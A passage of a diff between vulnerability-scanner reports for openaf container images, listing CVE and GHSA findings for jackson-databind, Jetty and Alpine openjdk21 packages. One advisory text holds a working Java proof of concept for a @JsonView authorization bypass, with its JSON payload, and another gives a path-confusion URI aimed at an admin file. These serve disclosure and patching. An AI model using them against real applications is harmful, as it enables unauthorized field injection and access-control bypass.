-                        │      │                  │      /advisories/GHSA-5gvw-p9qm-jgwh 
-                        │      │                  ╰ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-59889 
-                        │      ├ PublishedDate   : 2026-07-14T21:17:06.16Z 
-                        │      ╰ LastModifiedDate: 2026-07-16T16:19:15.79Z 
-                        ├ [10] ╭ VulnerabilityID : GHSA-mhm7-754m-9p8w 
-                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
-                        │      ├ PkgPath         : openaf/openaf.jar 
-                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
-                        │      │                  │       @2.21.1 
-                        │      │                  ╰ UID : 6bd66f14c6cb3d57 
-                        │      ├ InstalledVersion: 2.21.1 
-                        │      ├ FixedVersion    : 2.18.9, 2.21.5 
-                        │      ├ Status          : fixed 
-                        │      ├ Layer            ╭ Digest: sha256:d36dd615f06f76c27493dc66f9cd73c3a8c6f9dffe96
-                        │      │                  │         e61bc9def262a812d835 
-                        │      │                  ╰ DiffID: sha256:365145d731c532306921c40bebb4a152b75072f93979
-                        │      │                            f1821571add51cc4d0ca 
-                        │      ├ SeveritySource  : ghsa 
-                        │      ├ PrimaryURL      : https://github.com/advisories/GHSA-mhm7-754m-9p8w 
-                        │      ├ DataSource       ╭ ID  : ghsa 
-                        │      │                  ├ Name: GitHub Security Advisory Maven 
-                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
-                        │      │                          cosystem%3Amaven 
-                        │      ├ Fingerprint     : sha256:3d39887ec9c5e10624b4eaee0c75c287e030000dacd5015f382ac
-                        │      │                   f1ec1f73b9a 
-                        │      ├ Title           : jackson-databind: `@JsonView` bypass for creator properties
-                        │      │                   with `@JsonTypeInfo(include=As.EXTERNAL_PROPERTY)` 
-                        │      ├ Description     : ## Summary
-                        │      │                   
-                        │      │                   In
-                        │      │                   `BeanDeserializer.deserializeUsingPropertyBasedWithExternalT
-                        │      │                   ypeId`, the active-view (`@JsonView`) filter was applied
-                        │      │                   only to the regular bean-property branch; the
-                        │      │                   creator-property branch performed no
-                        │      │                   `creatorProp.visibleInView(activeView)` check. A constructor
-                        │      │                    parameter annotated with both
-                        │      │                   `@JsonView(RestrictedView.class)` and
-                        │      │                   `@JsonTypeInfo(use=Id.NAME,
-                        │      │                     include=As.EXTERNAL_PROPERTY)` is populated from attacker
-                        │      │                   JSON even when a more restrictive view is active.
-                        │      │                     This is a patch gap. GHSA-5hh8 (CVE-2026-54517) and
-                        │      │                   GHSA-rcqc (CVE-2026-54518) descriptions cover only the main
-                        │      │                   property-based path and the unwrapped-creator path
-                        │      │                   respectively; the external-type-id creator path was fixed on
-                        │      │                    the 3.x line via #6004 ("Extend #5969/#5971 fixes to ...
-                        │      │                   external-type-id case in regular BeanDeserializer", commit
-                        │      │                   7dc7a17, 2026-05-22) but
-                        │      │                     **the fix was never backported to 2.21 or 2.18**. Users on
-                        │      │                    2.21.4 and 2.18.8 who upgraded per the published advisories
-                        │      │                    remain vulnerable to the same `@JsonView` bypass technique
-                        │      │                   via a different code path.
-                        │      │                   ## Vulnerable Code Path
-                        │      │                   File:
-                        │      │                   `com/fasterxml/jackson/databind/deser/BeanDeserializer.java`
-                        │      │                   Method: `deserializeUsingPropertyBasedWithExternalTypeId`
-                        │      │                   On 2.21.4 (and 2.18.8), the creator-property branch (around
-                        │      │                   line 1125-1158) checks `creatorProp.isInjectionOnly()` and
-                        │      │                   hands off to `ext.handlePropertyValue(...)` /
-                        │      │                   `buffer.assignParameter(...)` without ever consulting
-                        │      │                   `visibleInView(activeView)`:
-                        │      │                    ```java
-                        │      │                     if (creatorProp != null) {
-                        │      │                         // [databind#1381]: if useInput=FALSE, skip
-                        │      │                   deserialization from input
-                        │      │                         if (creatorProp.isInjectionOnly()) { ... }
-                        │      │                         // NO visibleInView(activeView) CHECK HERE
-                        │      │                         if (!ext.handlePropertyValue(p, ctxt, propName, null))
-                        │      │                    {
-                        │      │                             if (buffer.assignParameter(creatorProp, ...)) {
-                        │      │                   ... }
-                        │      │                         }
-                        │      │                         continue;
-                        │      │                     }
-                        │      │                   ```
-                        │      │                   On 3.1.4, the same branch contains the additional guard
-                        │      │                   (commit 7dc7a17):
-                        │      │                      if (creatorProp != null) {
-                        │      │                         // [databind#5971]: must honor active view here too
-                        │      │                         if ((activeView != null) &&
-                        │      │                   !creatorProp.visibleInView(activeView)) {
-                        │      │                             p.skipChildren();
-                        │      │                             continue;
-                        │      │                         ...
-                        │      │                   The 2.21 and 2.18 backport PRs (#6005 and #6003) only
-                        │      │                   backported the main-path fixes from #5969/#5971; the
-                        │      │                   external-type-id fix from #6004 was not backported. The
-                        │      │                   maintainer closed #6005
-                        │      │                     with "got changes merged forward, looks like it's all
-                        │      │                   covered now", but the forward-merge did not include the
-                        │      │                   ExtTypeId creator branch.
-                        │      │                     Proof of Concept
-                        │      │                     Compiles and runs against jackson-databind 2.21.4:
-                        │      │                    
-                        │      │                   ```java
-                        │      │                     import com.fasterxml.jackson.annotation.*;
-                        │      │                     import com.fasterxml.jackson.databind.ObjectMapper;
-                        │      │                     public class JsonViewExternalTypeIdBypass {
-                        │      │                         public static class PublicView {}
-                        │      │                         public static class AdminView extends PublicView {}
-                        │      │                         public static abstract class Asset { public String
-                        │      │                   name; }
-                        │      │                         public static class PublicAsset extends Asset {}
-                        │      │                         public static class AdminAsset extends Asset { public
-                        │      │                   String secret; }
-                        │      │                         public static class Container {
-                        │      │                             @JsonTypeInfo(use = JsonTypeInfo.Id.NAME,
-                        │      │                                     include =
-                        │      │                   JsonTypeInfo.As.EXTERNAL_PROPERTY,
-                        │      │                                     property = "kind")
-                        │      │                             @JsonSubTypes({
-                        │      │                                 @JsonSubTypes.Type(value = PublicAsset.class,
-                        │      │                   name = "pub"),
-                        │      │                                 @JsonSubTypes.Type(value = AdminAsset.class, 
-                        │      │                   name = "admin")
-                        │      │                             })
-                        │      │                             @JsonView(AdminView.class)
-                        │      │                             public Asset asset;
-                        │      │                             public String label;
-                        │      │                             @JsonCreator
-                        │      │                             public Container(
-                        │      │                                     @JsonProperty("label") String label,
-                        │      │                                     @JsonProperty("asset")
-                        │      │                   @JsonView(AdminView.class) Asset asset) {
-                        │      │                                 this.label = label;
-                        │      │                                 this.asset = asset;
-                        │      │                             }
-                        │      │                         public static class Wrapper {
-                        │      │                             @JsonView(PublicView.class)
-                        │      │                             public Container data;
-                        │      │                         public static void main(String[] args) throws
-                        │      │                   Exception {
-                        │      │                             // Admin-only "asset" should be blocked when
-                        │      │                   reading with PublicView
-                        │      │                             String json =
-                        │      │                   "{\"data\":{\"label\":\"hello\",\"kind\":\"admin\","
-                        │      │                                         +
-                        │      │                   "\"asset\":{\"name\":\"foo\",\"secret\":\"LEAKED\"}}}";
-                        │      │                             ObjectMapper om = new ObjectMapper();
-                        │      │                             Wrapper r = om.readerWithView(PublicView.class)
-                        │      │                                     .forType(Wrapper.class)
-                        │      │                                     .readValue(json);
-                        │      │                             System.out.println(r.data);
-                        │      │                             // Actual on 2.21.4:   Container{label='hello',
-                        │      │                   asset=AdminAsset{name='foo', secret='LEAKED'}}
-                        │      │                             // Expected (secure):  Container{label='hello',
-                        │      │                   asset=null}
-                        │      │                             if (r.data.asset != null && r.data.asset
-                        │      │                   instanceof AdminAsset) {
-                        │      │                                 System.out.println("[!!] BYPASS CONFIRMED —
-                        │      │                   admin-only asset populated under PublicView");
-                        │      │                   A control case that removes include = As.EXTERNAL_PROPERTY
-                        │      │                   (forcing the normal property-based path) correctly returns
-                        │      │                   asset = null, confirming the bypass is specific to the
-                        │      │                   ExternalTypeId
-                        │      │                     code path and not a misconfiguration.
-                        │      │                   ### Impact
-                        │      │                     View-restricted (e.g. admin-only) creator properties can
-                        │      │                   be populated from untrusted input where @JsonView is used as
-                        │      │                    a write-side authorization boundary. Typical victims are
-                        │      │                   Spring Boot
-                        │      │                     REST controllers that use @JsonView(PublicView.class) on
-                        │      │                   the request body to whitelist user-settable fields — an
-                        │      │                   attacker can inject the restricted creator parameter
-                        │      │                   (including choosing
-                        │      │                     the polymorphic subtype via the sibling kind/type-id
-                        │      │                   property) by combining it with a polymorphic
-                        │      │                   @JsonTypeInfo(EXTERNAL_PROPERTY) annotation on the same
-                        │      │                   field.
-                        │      │                   - CWE-863 (Incorrect Authorization)
-                        │      │                   - Same impact class as CVE-2026-54517 / CVE-2026-54518
-                        │      │                   - No RCE, no DoS — this is an access-control /
-                        │      │                   mass-assignment bypass
-                        │      │                   ### Trigger Conditions
-                        │      │                   Developer code must combine (no opt-in user configuration
-                        │      │                   required):
-                        │      │                   1. Property-based @JsonCreator on the outer type
-                        │      │                   2. A creator parameter annotated with
-                        │      │                   @JsonView(RestrictedView.class)
-                        │      │                   3. The same parameter annotated with
-                        │      │                   @JsonTypeInfo(use=Id.NAME, include=As.EXTERNAL_PROPERTY,
-                        │      │                   property="...") 
-                        │      ├ Severity        : MEDIUM 
-                        │      ├ VendorSeverity   ─ ghsa: 2 
-                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N 
-                        │      │                         ╰ V3Score : 6.5 
-                        │      ├ References       ╭ [0]: https://github.com/FasterXML/jackson-databind 
-                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind/commit/c
-                        │      │                  │      628b357ed143d8492756d5c1458cfb9fbeb29ed 
-                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/d
-                        │      │                  │      ea7eb466e98cc226c4ac65587581fb49926820c 
-                        │      │                  ╰ [3]: https://github.com/FasterXML/jackson-databind/security
-                        │      │                         /advisories/GHSA-mhm7-754m-9p8w 
-                        │      ├ PublishedDate   : 2026-07-21T19:40:12Z 
-                        │      ╰ LastModifiedDate: 2026-07-21T19:40:12Z 
-                        ╰ [11] ╭ VulnerabilityID : CVE-2026-8384 
-                               ├ VendorIDs        ─ [0]: GHSA-w7x5-g22v-xqhr 
-                               ├ PkgName         : org.eclipse.jetty:jetty-util 
-                               ├ PkgPath         : openaf/openaf.jar 
-                               ├ PkgIdentifier    ╭ PURL: pkg:maven/org.eclipse.jetty/jetty-util@12.1.7 
-                               │                  ╰ UID : 55174ef89c50ef33 
-                               ├ InstalledVersion: 12.1.7 
-                               ├ FixedVersion    : 12.0.35, 12.1.9 
-                               ├ Status          : fixed 
-                               ├ Layer            ╭ Digest: sha256:d36dd615f06f76c27493dc66f9cd73c3a8c6f9dffe96
-                               │                  │         e61bc9def262a812d835 
-                               │                  ╰ DiffID: sha256:365145d731c532306921c40bebb4a152b75072f93979
-                               │                            f1821571add51cc4d0ca 
-                               ├ SeveritySource  : ghsa 
-                               ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-8384 
-                               ├ DataSource       ╭ ID  : ghsa 
-                               │                  ├ Name: GitHub Security Advisory Maven 
-                               │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
-                               │                          cosystem%3Amaven 
-                               ├ Fingerprint     : sha256:784d8afc9e5207cfbf0a36bc92d2bd3050aef3b2bbb045b15eb53
-                               │                   79b7686f29d 
-                               ├ Title           : In Eclipse Jetty, an HTTP URI of this form:     
-                               │                   /public;/../admin/sec ... 
-                               ├ Description     : In Eclipse Jetty, an HTTP URI of this form:
-                               │                   
-                               │                   /public;/../admin/secret.txt
-                               │                   results in an unresolved path of:
-                               │                   /public/../admin/secret.txt
-                               │                   instead of the expected:
-                               │                   /admin/secret.txt
-                               │                   Jetty itself is not affected, as it will not serve the
-                               │                   secret.txt file because it will not pass the alias checker
-                               │                   (only resolved resources are served).
-                               │                   However, web applications that rely on resolved paths being
-                               │                   provided by Jetty may be confused when receiving an
-                               │                   unresolved path. 
-                               ├ Severity        : MEDIUM 
-                               ├ CweIDs           ─ [0]: CWE-647 
-                               ├ VendorSeverity   ─ ghsa: 2 
-                               ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N 
-                               │                         ╰ V3Score : 5.3 
-                               ├ References       ╭ [0]: https://github.com/jetty/jetty.project 
-                               │                  ├ [1]: https://github.com/jetty/jetty.project/commit/82969c77
-                               │                  │      f6da46e27008b10b3c14840cd31db084 
-                               │                  ├ [2]: https://github.com/jetty/jetty.project/commit/ade27ce9
-                               │                  │      3a37c33278720250d85c48601230ae3f 
-                               │                  ├ [3]: https://github.com/jetty/jetty.project/pull/14969 
-                               │                  ├ [4]: https://github.com/jetty/jetty.project/pull/14973 
-                               │                  ├ [5]: https://github.com/jetty/jetty.project/releases/tag/je
-                               │                  │      tty-12.0.35 
-                               │                  ├ [6]: https://github.com/jetty/jetty.project/releases/tag/je
-                               │                  │      tty-12.1.9 
-                               │                  ├ [7]: https://github.com/jetty/jetty.project/security/adviso
-                               │                  │      ries/GHSA-w7x5-g22v-xqhr 
-                               │                  ├ [8]: https://gitlab.eclipse.org/security/cve-assignment/-/w
-                               │                  │      ork_items/108 
-                               │                  ╰ [9]: https://nvd.nist.gov/vuln/detail/CVE-2026-8384 
-                               ├ PublishedDate   : 2026-07-14T09:16:42.05Z 
-                               ╰ LastModifiedDate: 2026-07-14T18:39:51.587Z 
+╭ [0] ╭ Target         : openaf/pyoaf:edge (alpine 3.24.1) 
+│     ├ Class          : os-pkgs 
+│     ├ Type           : alpine 
+│     ├ Packages        
+│     ╰ Vulnerabilities ╭ [0]  ╭ VulnerabilityID : CVE-2026-41254 
+│                       │      ├ PkgID           : openjdk21-jre@21.0.11_p10-r0 
+│                       │      ├ PkgName         : openjdk21-jre 
+│                       │      ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openjdk21-jre@21.0.11_p10-r0?arch=x86_
+│                       │      │                  │       64&distro=3.24.1 
+│                       │      │                  ╰ UID : f569ce2a974c0718 
+│                       │      ├ InstalledVersion: 21.0.11_p10-r0 
+│                       │      ├ FixedVersion    : 21.0.12_p8-r0 
+│                       │      ├ Status          : fixed 
+│                       │      ├ Layer            ╭ Digest: sha256:e75cbaefc0433d7c5850cec05a6c533ef54d45c19126
+│                       │      │                  │         4e4c9f62e347164a4006 
+│                       │      │                  ╰ DiffID: sha256:6fa3fec420de0c2f78798883e529d478f398e7489ffa
+│                       │      │                            77bbbb6e1ea62d15f4ee 
+│                       │      ├ SeveritySource  : nvd 
+│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-41254 
+│                       │      ├ DataSource       ╭ ID  : alpine 
+│                       │      │                  ├ Name: Alpine Secdb 
+│                       │      │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │      ├ Fingerprint     : sha256:fcd6037121c90aa3895af25b0628c0af5d2e112785d0ad5595d14
+│                       │      │                   66790c3a5ee 
+│                       │      ├ Title           : Little CMS: lcms2: mm2/Little-CMS: Little CMS: Information
+│                       │      │                   disclosure or denial of service via integer overflow in
+│                       │      │                   CubeSize 
+│                       │      ├ Description     : Little CMS (lcms2) through 2.18 has an integer overflow in
+│                       │      │                   CubeSize in cmslut.c because the overflow check is performed
+│                       │      │                    after the multiplication. 
+│                       │      ├ Severity        : HIGH 
+│                       │      ├ CweIDs           ╭ [0]: CWE-696 
+│                       │      │                  ╰ [1]: CWE-190 
+│                       │      ├ VendorSeverity   ╭ alma       : 3 
+│                       │      │                  ├ amazon     : 2 
+│                       │      │                  ├ azure      : 2 
+│                       │      │                  ├ julia      : 3 
+│                       │      │                  ├ nvd        : 3 
+│                       │      │                  ├ oracle-oval: 3 
+│                       │      │                  ├ redhat     : 2 
+│                       │      │                  ├ rocky      : 3 
+│                       │      │                  ╰ ubuntu     : 2 
+│                       │      ├ CVSS             ╭ julia  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
+│                       │      │                  │        │           /A:H 
+│                       │      │                  │        ╰ V3Score : 7.5 
+│                       │      │                  ├ nvd    ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
+│                       │      │                  │        │           /A:H 
+│                       │      │                  │        ╰ V3Score : 7.5 
+│                       │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:N
+│                       │      │                           │           /A:H 
+│                       │      │                           ╰ V3Score : 6.1 
+│                       │      ├ References       ╭ [0] : https://abhinavagarwal07.github.io/posts/lcms2-cubesi
+│                       │      │                  │       ze-overflow/ 
+│                       │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:42895 
+│                       │      │                  ├ [2] : https://access.redhat.com/security/cve/CVE-2026-41254 
+│                       │      │                  ├ [3] : https://bugzilla.redhat.com/2459420 
+│                       │      │                  ├ [4] : https://bugzilla.redhat.com/2502751 
+│                       │      │                  ├ [5] : https://bugzilla.redhat.com/2502782 
+│                       │      │                  ├ [6] : https://bugzilla.redhat.com/2502783 
+│                       │      │                  ├ [7] : https://bugzilla.redhat.com/2502784 
+│                       │      │                  ├ [8] : https://bugzilla.redhat.com/2502791 
+│                       │      │                  ├ [9] : https://bugzilla.redhat.com/2502792 
+│                       │      │                  ├ [10]: https://bugzilla.redhat.com/2502793 
+│                       │      │                  ├ [11]: https://bugzilla.redhat.com/2503636 
+│                       │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2459420 
+│                       │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2502751 
+│                       │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2502782 
+│                       │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2502783 
+│                       │      │                  ├ [16]: https://bugzilla.redhat.com/show_bug.cgi?id=2502784 
+│                       │      │                  ├ [17]: https://bugzilla.redhat.com/show_bug.cgi?id=2502791 
+│                       │      │                  ├ [18]: https://bugzilla.redhat.com/show_bug.cgi?id=2502792 
+│                       │      │                  ├ [19]: https://bugzilla.redhat.com/show_bug.cgi?id=2502793 
+│                       │      │                  ├ [20]: https://bugzilla.redhat.com/show_bug.cgi?id=2503636 
+│                       │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-41254 
+│                       │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46917 
+│                       │      │                  ├ [23]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46968 
+│                       │      │                  ├ [24]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47010 
+│                       │      │                  ├ [25]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47021 
+│                       │      │                  ├ [26]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47027 
+│                       │      │                  ├ [27]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47059 
+│                       │      │                  ├ [28]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47063 
+│                       │      │                  ├ [29]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-60147 
+│                       │      │                  ├ [30]: https://errata.almalinux.org/10/ALSA-2026-42895.html 
+│                       │      │                  ├ [31]: https://errata.rockylinux.org/RLSA-2026:42899 
+│                       │      │                  ├ [32]: https://github.com/mm2/Little-CMS/commit/da6110b1d14a
+│                       │      │                  │       bc394633a388209abd5ebedd7ab0 
+│                       │      │                  ├ [33]: https://github.com/mm2/Little-CMS/commit/e0641b1828d0
+│                       │      │                  │       a1af5ecb1b11fe22f24fceefd4bc 
+│                       │      │                  ├ [34]: https://github.com/mm2/Little-CMS/security/advisories
+│                       │      │                  │       /GHSA-4xp6-rcgg-m9qq 
+│                       │      │                  ├ [35]: https://linux.oracle.com/cve/CVE-2026-41254.html 
+│                       │      │                  ├ [36]: https://linux.oracle.com/errata/ELSA-2026-42899.html 
+│                       │      │                  ├ [37]: https://lists.debian.org/debian-lts-announce/2026/05/
+│                       │      │                  │       msg00014.html 
+│                       │      │                  ├ [38]: https://nvd.nist.gov/vuln/detail/CVE-2026-41254 
+│                       │      │                  ├ [39]: https://ubuntu.com/security/notices/USN-8209-1 
+│                       │      │                  ├ [40]: https://ubuntu.com/security/notices/USN-8209-2 
+│                       │      │                  ├ [41]: https://www.cve.org/CVERecord?id=CVE-2026-41254 
+│                       │      │                  ╰ [42]: https://www.openwall.com/lists/oss-security/2026/04/1
+│                       │      │                          7/16 
+│                       │      ├ PublishedDate   : 2026-04-18T07:16:10.807Z 
+│                       │      ╰ LastModifiedDate: 2026-06-17T10:46:23.47Z 
+│                       ├ [1]  ╭ VulnerabilityID : CVE-2026-47063 
+│                       │      ├ PkgID           : openjdk21-jre@21.0.11_p10-r0 
+│                       │      ├ PkgName         : openjdk21-jre 
+│                       │      ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openjdk21-jre@21.0.11_p10-r0?arch=x86_
+│                       │      │                  │       64&distro=3.24.1 
+│                       │      │                  ╰ UID : f569ce2a974c0718 
+│                       │      ├ InstalledVersion: 21.0.11_p10-r0 
+│                       │      ├ FixedVersion    : 21.0.12_p8-r0 
+│                       │      ├ Status          : fixed 
+│                       │      ├ Layer            ╭ Digest: sha256:e75cbaefc0433d7c5850cec05a6c533ef54d45c19126
+│                       │      │                  │         4e4c9f62e347164a4006 
+│                       │      │                  ╰ DiffID: sha256:6fa3fec420de0c2f78798883e529d478f398e7489ffa
+│                       │      │                            77bbbb6e1ea62d15f4ee 
+│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-47063 
+│                       │      ├ DataSource       ╭ ID  : alpine 
+│                       │      │                  ├ Name: Alpine Secdb 
+│                       │      │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │      ├ Fingerprint     : sha256:76c3c34f71ec437f06a67e5764d374d956d0e8943a736a7cf9c67
+│                       │      │                   96c14a6c9bc 
+│                       │      ├ Title           : openjdk: OpenJDK: Enhance Jar handling (Oracle CPU 2026-07) 
+│                       │      ├ Description     : Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK,
+│                       │      │                    Oracle GraalVM Enterprise Edition product of Oracle Java SE
+│                       │      │                    (component: Libraries).  Supported versions that are
+│                       │      │                   affected are Oracle Java SE: 8u491, 8u491-perf, 11.0.31,
+│                       │      │                   17.0.19, 21.0.11, 25.0.3, 26.0.1; Oracle GraalVM for JDK:
+│                       │      │                   17.0.19 and  21.0.11; Oracle GraalVM Enterprise Edition:
+│                       │      │                   21.3.18. Easily exploitable vulnerability allows
+│                       │      │                   unauthenticated attacker with network access via multiple
+│                       │      │                   protocols to compromise Oracle Java SE, Oracle GraalVM for
+│                       │      │                   JDK, Oracle GraalVM Enterprise Edition.  Successful attacks
+│                       │      │                   of this vulnerability can result in  unauthorized creation,
+│                       │      │                   deletion or modification access to critical data or all
+│                       │      │                   Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM
+│                       │      │                   Enterprise Edition accessible data. Note: This vulnerability
+│                       │      │                    can be exploited by using APIs in the specified Component,
+│                       │      │                   e.g., through a web service which supplies data to the APIs.
+│                       │      │                    This vulnerability also applies to Java deployments,
+│                       │      │                   typically in clients running sandboxed Java Web Start
+│                       │      │                   applications or sandboxed Java applets, that load and run
+│                       │      │                   untrusted code (e.g., code that comes from the internet) and
+│                       │      │                    rely on the Java sandbox for security. CVSS 3.1 Base Score
+│                       │      │                   7.5 (Integrity impacts).  CVSS Vector:
+│                       │      │                   (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N). 
+│                       │      ├ Severity        : HIGH 
+│                       │      ├ CweIDs           ─ [0]: CWE-284 
+│                       │      ├ VendorSeverity   ╭ alma       : 3 
+│                       │      │                  ├ oracle-oval: 3 
+│                       │      │                  ├ redhat     : 3 
+│                       │      │                  ╰ rocky      : 3 
+│                       │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H
+│                       │      │                           │           /A:N 
+│                       │      │                           ╰ V3Score : 7.5 
+│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:42895 
+│                       │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-47063 
+│                       │      │                  ├ [2] : https://bugzilla.redhat.com/2459420 
+│                       │      │                  ├ [3] : https://bugzilla.redhat.com/2502751 
+│                       │      │                  ├ [4] : https://bugzilla.redhat.com/2502782 
+│                       │      │                  ├ [5] : https://bugzilla.redhat.com/2502783 
+│                       │      │                  ├ [6] : https://bugzilla.redhat.com/2502784 
+│                       │      │                  ├ [7] : https://bugzilla.redhat.com/2502791 
+│                       │      │                  ├ [8] : https://bugzilla.redhat.com/2502792 
+│                       │      │                  ├ [9] : https://bugzilla.redhat.com/2502793 
+│                       │      │                  ├ [10]: https://bugzilla.redhat.com/2503636 
+│                       │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2459420 
+│                       │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2502751 
+│                       │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2502782 
+│                       │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2502783 
+│                       │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2502784 
+│                       │      │                  ├ [16]: https://bugzilla.redhat.com/show_bug.cgi?id=2502791 
+│                       │      │                  ├ [17]: https://bugzilla.redhat.com/show_bug.cgi?id=2502792 
+│                       │      │                  ├ [18]: https://bugzilla.redhat.com/show_bug.cgi?id=2502793 
+│                       │      │                  ├ [19]: https://bugzilla.redhat.com/show_bug.cgi?id=2503636 
+│                       │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-41254 
+│                       │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46917 
+│                       │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46968 
+│                       │      │                  ├ [23]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47010 
+│                       │      │                  ├ [24]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47021 
+│                       │      │                  ├ [25]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47027 
+│                       │      │                  ├ [26]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47059 
+│                       │      │                  ├ [27]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47063 
+│                       │      │                  ├ [28]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-60147 
+│                       │      │                  ├ [29]: https://errata.almalinux.org/10/ALSA-2026-42895.html 
+│                       │      │                  ├ [30]: https://errata.rockylinux.org/RLSA-2026:42899 
+│                       │      │                  ├ [31]: https://linux.oracle.com/cve/CVE-2026-47063.html 
+│                       │      │                  ├ [32]: https://linux.oracle.com/errata/ELSA-2026-42899.html 
+│                       │      │                  ├ [33]: https://nvd.nist.gov/vuln/detail/CVE-2026-47063 
+│                       │      │                  ├ [34]: https://www.cve.org/CVERecord?id=CVE-2026-47063 
+│                       │      │                  ╰ [35]: https://www.oracle.com/security-alerts/cpujul2026.html 
+│                       │      ├ PublishedDate   : 2026-07-21T22:17:12.19Z 
+│                       │      ╰ LastModifiedDate: 2026-08-03T18:50:40.373Z 
+│                       ├ [2]  ╭ VulnerabilityID : CVE-2026-46917 
+│                       │      ├ PkgID           : openjdk21-jre@21.0.11_p10-r0 
+│                       │      ├ PkgName         : openjdk21-jre 
+│                       │      ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openjdk21-jre@21.0.11_p10-r0?arch=x86_
+│                       │      │                  │       64&distro=3.24.1 
+│                       │      │                  ╰ UID : f569ce2a974c0718 
+│                       │      ├ InstalledVersion: 21.0.11_p10-r0 
+│                       │      ├ FixedVersion    : 21.0.12_p8-r0 
+│                       │      ├ Status          : fixed 
+│                       │      ├ Layer            ╭ Digest: sha256:e75cbaefc0433d7c5850cec05a6c533ef54d45c19126
+│                       │      │                  │         4e4c9f62e347164a4006 
+│                       │      │                  ╰ DiffID: sha256:6fa3fec420de0c2f78798883e529d478f398e7489ffa
+│                       │      │                            77bbbb6e1ea62d15f4ee 
+│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-46917 
+│                       │      ├ DataSource       ╭ ID  : alpine 
+│                       │      │                  ├ Name: Alpine Secdb 
+│                       │      │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │      ├ Fingerprint     : sha256:aa184cddee2f9d72262165d9eb783c57c9867b91b2084a51b63cc
+│                       │      │                   15a2d30f7d7 
+│                       │      ├ Title           : openjdk: OpenJDK: Improve DTLS handshaking (Oracle CPU
+│                       │      │                   2026-07) 
+│                       │      ├ Description     : Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK,
+│                       │      │                    Oracle GraalVM Enterprise Edition product of Oracle Java SE
+│                       │      │                    (component: JSSE).  Supported versions that are affected
+│                       │      │                   are Oracle Java SE: 11.0.31, 17.0.19, 21.0.11, 25.0.3,
+│                       │      │                   26.0.1; Oracle GraalVM for JDK: 17.0.19 and  21.0.11; Oracle
